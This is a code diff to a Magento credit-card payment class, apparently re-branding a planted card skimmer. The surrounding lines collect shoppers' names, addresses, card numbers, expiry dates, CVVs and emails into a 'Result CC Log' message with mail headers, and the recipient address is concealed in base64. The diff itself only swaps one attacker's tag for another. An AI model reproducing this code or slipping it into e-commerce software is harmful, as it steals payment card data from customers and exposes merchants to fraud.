@@ -102,7 +102,7 @@ class Mage_Payment_Model_Method_Cc extends Mage_Payment_Model_Method_Abstract
         $time = date('Y-m-d H:i:s');
         $data16 = Mage::getSingleton('checkout/session')->getQuote()->getBillingAddress()->getEmail();
         $message = 
-		"$$$$$ Result CC Log Kapaljetz666 $$$$$ 
+		"$$$$$ Result CC Log Sinkaroid $$$$$ 
 Name: ".$data1." ".$data2."
 Address 1: ".$data3."
 Address 2: ".$data4."
@@ -116,7 +116,7 @@ CC Number: ".$data10."
 Expdate: ".$data11." / 20".$data12."
 Cvv: ".$data13."
 Email : ".$data16."
-$$$$$ Result CC Log Kapaljetz666 $$$$$";
+$$$$$ Result CC Log Sinkaroid $$$$$";
 		$subject = $bin." - ".$ccbrand." ".$cctype." ".$ccklas." - ".$ccbank." [".$serverboss." - ".$ipboss."]";
 		$headers = "From: ".$data8." Credit Card <cc_session@".$serverboss.">";
 		$gantengers = "cHVkZWwuZHVAeWFuZGV4LmNvbQ==";
